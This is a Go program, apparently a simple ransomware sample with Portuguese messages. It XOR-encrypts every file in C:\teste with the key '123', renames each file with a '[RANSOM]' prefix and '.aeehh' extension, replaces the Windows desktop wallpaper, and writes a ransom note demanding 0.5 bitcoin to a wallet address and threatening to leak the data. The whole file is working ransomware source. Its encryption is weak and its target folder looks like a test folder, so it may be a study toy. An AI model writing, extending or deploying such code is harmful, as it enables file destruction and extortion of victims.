package main

import (
	_ "embed"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

//go:embed wallpaper.jpg
var wallpaperData []byte

const (
	password             = "123"
	spiSetDeskWallpaper  = 0x0014
	spifUpdateIniFile    = 0x01
	spifSendWinIniChange = 0x02
	targetDir            = `C:\teste`
)

var (
	user32           = windows.NewLazySystemDLL("user32.dll")
	systemParameters = user32.NewProc("SystemParametersInfoW")
)

func xorEncrypt(data []byte) []byte {
	encrypted := make([]byte, len(data))
	for i := range data {
		encrypted[i] = data[i] ^ password[i%len(password)]
	}
	return encrypted
}

func setWallpaper() error {
	// Criar pasta se não existir
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return fmt.Errorf("falha ao criar pasta: %v", err)
	}

	// Salvar wallpaper.jpg em C:\teste
	wallpaperPath := filepath.Join(targetDir, "wallpaper.jpg")
	if err := ioutil.WriteFile(wallpaperPath, wallpaperData, 0644); err != nil {
		return fmt.Errorf("falha ao salvar wallpaper: %v", err)
	}

	// Alterar o wallpaper
	pathUTF16, err := windows.UTF16PtrFromString(wallpaperPath)
	if err != nil {
		return err
	}

	ret, _, _ := systemParameters.Call(
		uintptr(spiSetDeskWallpaper),
		0,
		uintptr(unsafe.Pointer(pathUTF16)),
		uintptr(spifUpdateIniFile|spifSendWinIniChange),
	)

	if ret == 0 {
		return fmt.Errorf("falha ao alterar o wallpaper")
	}
	return nil
}

func main() {
	fmt.Println("[!] Iniciando criptografia...")

	// Configurar wallpaper
	if err := setWallpaper(); err != nil {
		fmt.Println("[ERRO]", err)
		return
	}

	// Criptografar arquivos
	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || filepath.Base(path) == "wallpaper.jpg" {
			return nil
		}

		data, _ := ioutil.ReadFile(path)
		encryptedData := xorEncrypt(data)
		ioutil.WriteFile(path, encryptedData, 0644)

		newName := "[RANSOM]" + info.Name() + ".aeehh"
		os.Rename(path, filepath.Join(filepath.Dir(path), newName))

		return nil
	})

	// Criar mensagem de resgate
	rescueNote := []byte(`
☠️☠️☠️ SEUS ARQUIVOS FORAM SEQUESTRADOS! ☠️☠️☠️

TODOS OS SEUS DADOS, FOTOS E DOCUMENTOS FORAM CRIPTOGRAFADOS!
PARA DESBLOQUEAR, ENVIE 0.5 BITCOIN PARA: bc1qxy2kgdygjrsqtzq2n0yrf249fgw2q9u4h2d3tg

VOCÊ TEM 72 HORAS. APÓS ISSO, SEUS ARQUIVOS SERÃO VAZADOS NA DARK WEB!
`)
	ioutil.WriteFile(filepath.Join(targetDir, "!!!WARNING!!!.txt"), rescueNote, 0644)

	fmt.Println("[!] Criptografia concluída. Chave:", password)
}
